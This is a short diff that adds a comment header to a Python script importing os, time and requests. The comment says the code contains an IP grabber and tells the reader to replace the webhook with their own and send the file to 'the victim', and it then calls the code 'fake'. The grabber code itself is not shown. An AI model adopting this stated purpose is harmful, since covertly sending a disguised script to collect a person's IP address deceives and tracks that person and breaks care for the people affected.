@@ -1,3 +1,9 @@
+# a simple ip graber is in this code so juste replace the webhook by your own and sent this to the victim
+#obviously it's fake !
+
+
+
+
 import os
 import time
 import requests
